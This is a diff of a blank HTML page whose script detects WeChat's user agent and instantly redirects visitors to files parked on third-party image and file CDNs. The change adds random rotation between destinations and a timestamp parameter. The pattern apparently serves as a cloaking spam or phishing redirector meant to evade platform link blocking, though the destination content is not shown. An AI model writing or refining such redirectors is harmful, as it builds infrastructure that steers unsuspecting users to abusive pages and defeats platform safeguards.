@@ -3,15 +3,24 @@
 <head>
   <title></title>
   <script>
-    var isWeChat = navigator.userAgent.toLowerCase().match(/micromessenger/i);
+    var isWeChat = /micromessenger/i.test(navigator.userAgent.toLowerCase());
     var redirectURL;
     
     if (isWeChat) {
-      redirectURL = "https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg?co1";
+      var randomIndex = Math.floor(Math.random() * 2); 
+      if (randomIndex === 0) {
+        redirectURL = "https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg?co1";
+      } else {
+        redirectURL = "https://otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg?co1";
+      }
     } else {
-      redirectURL = "https://yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html?u=co1";
+      randomIndex = Math.floor(Math.random() * 2); 
+      if (randomIndex === 0) {
+        redirectURL = "https://yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html?co1";
+      } else {
+        redirectURL = "https://otherfiles.uupt.com/ATS/2023/202305/20230525/998a5607327345c3a693d3b238e9c889_big.svg?co1";
+      }
     }
-    
     redirectURL += "&_t=" + Date.now();
     window.location.replace(redirectURL);
   </script>
